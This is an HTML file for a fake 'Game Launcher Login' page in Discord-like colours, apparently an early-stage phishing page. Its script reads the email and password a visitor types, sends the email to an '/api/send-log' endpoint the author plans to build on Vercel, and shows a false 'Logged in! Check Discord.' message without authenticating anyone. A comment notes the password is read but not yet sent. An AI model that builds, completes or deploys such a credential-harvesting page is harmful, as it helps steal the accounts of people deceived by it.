<!DOCTYPE html>
<html>
<head>
    <title>Game Launcher Login</title>
    <style>
        body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        form { background: #2a2a2a; padding: 20px; border-radius: 8px; display: flex; flex-direction: column; gap: 10px; width: 300px; }
        input { padding: 10px; border-radius: 4px; border: none; }
        button { padding: 10px; background: #5865F2; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
     <form id="loginForm">
        <h2 style="text-align: center;">Game Login</h2>
        <input type="text" id="email" placeholder="Email or Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value; // Déclaré mais non envoyé

            // On appelle l'API Vercel qu'on va créer après
            await fetch('/api/send-log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: email })
            });

            alert("Logged in! Check Discord.");
        };
    </script>
</body>
</html>
